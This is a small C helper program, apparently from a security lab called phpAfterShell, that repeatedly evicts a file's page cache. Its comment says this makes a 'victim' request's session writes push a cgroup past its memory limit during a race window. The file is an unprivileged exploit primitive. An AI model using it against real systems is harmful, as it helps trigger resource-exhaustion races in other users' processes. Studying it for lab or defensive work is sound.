/*
 * sessdrop - drop a file's clean page cache for a bounded time.
 *
 * posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED) evicts the clean pages of
 * the file from the page cache (and therefore from this cgroup's charge);
 * dirty pages are written back by the kernel first and stay charged until
 * then. The phpAfterShell lab's phase-1 app spawns this while the victim
 * request rewrites a session record, so the victim's pwrite re-creates -
 * re-charges - the evicted pages and the cgroup crosses its limit inside
 * the splice window. Unprivileged: only a read fd on the file is needed.
 *
 * usage: sessdrop <path> [milliseconds]
 */
#define _POSIX_C_SOURCE 200809L
#include <fcntl.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

int main(int argc, char **argv) {
    if (argc < 2) return 2;
    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) return 1;
    int ms = argc > 2 ? atoi(argv[2]) : 4000;
    if (ms < 100) ms = 100;
    if (ms > 8000) ms = 8000;

    struct timespec t, req = {0, 2000 * 1000}; /* 2ms between drops */
    clock_gettime(CLOCK_MONOTONIC, &t);
    long long end = (long long)t.tv_sec * 1000 + t.tv_nsec / 1000000 + ms;
    for (;;) {
        posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
        clock_gettime(CLOCK_MONOTONIC, &t);
        if ((long long)t.tv_sec * 1000 + t.tv_nsec / 1000000 >= end) break;
        nanosleep(&req, NULL);
    }
    close(fd);
    return 0;
}
